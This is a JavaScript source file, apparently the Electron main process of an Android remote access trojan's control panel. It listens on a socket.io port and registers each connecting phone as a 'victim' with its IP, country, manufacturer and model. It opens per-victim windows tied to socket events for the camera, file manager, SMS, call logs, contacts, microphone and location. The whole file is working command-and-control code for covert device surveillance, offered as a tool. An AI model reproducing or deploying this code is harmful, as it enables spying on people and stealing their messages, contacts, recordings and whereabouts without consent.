const { app, BrowserWindow } = require('electron');
const electron = require('electron');
const { ipcMain } = require('electron');

let mainWindow;

var IO;
var windows = {};
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/javascripts/models/victims');
module.exports = victimsList;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 700,
    center: true,
    minWidth: 900,
    minHeight: 500,
  });

  mainWindow.setMenu(null);
  mainWindow.loadURL('file://' + __dirname + '/app/index.html');

  mainWindow.on('closed', function() {
    mainWindow = null;
  });
}

app.on('ready', createWindow);

app.on('window-all-closed', function() {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', function() {
  if (mainWindow === null) {
    createWindow();
  }
});

ipcMain.on('SocketIO:Listen', function(event, port) {
  IO = io.listen(port);
  IO.sockets.pingInterval = 10000;
  IO.sockets.on('connection', function(socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    var country = null;
    var geo = geoip.lookup(ip);

    if (geo) {
      country = geo.country.toLowerCase();
    }

    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
    mainWindow.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function() {
      victimsList.rmVictim(index);
      mainWindow.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:VictimDisconnected');
        delete windows[index];
      }
    });
  });
});

process.on('uncaughtException', function(error) {
  if (error.code == 'EADDRINUSE') {
    mainWindow.webContents.send('SocketIO:Listen', 'Address Already in Use');
  } else {
    electron.dialog.showErrorBox('ERROR', JSON.stringify(error));
  }
});

ipcMain.on('openLabWindow', function(e, page, index) {
  let child = new BrowserWindow({
    width: 1200,
    height: 900,
    frame: false,
    resizable: false,
    parent: mainWindow,
  });

  windows[index] = child.id;
  child.webContents.victim = victimsList.getVictim(index).socket;

  child.setMenu(null);
  child.loadURL('file://' + __dirname + '/app/' + page);

  child.once('ready-to-show', function() {
    child.show();
  });

  child.on('closed', function() {
    delete windows[index];

    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners('x0000ca'); // camera
      victimsList.getVictim(index).socket.removeAllListeners('x0000fm'); // file manager
      victimsList.getVictim(index).socket.removeAllListeners('x0000sm'); // sms
      victimsList.getVictim(index).socket.removeAllListeners('x0000cl'); // call logs
      victimsList.getVictim(index).socket.removeAllListeners('x0000cn'); // contacts
      victimsList.getVictim(index).socket.removeAllListeners('x0000mc'); // mic
      victimsList.getVictim(index).socket.removeAllListeners('x0000lm'); // location
    }
  });
});
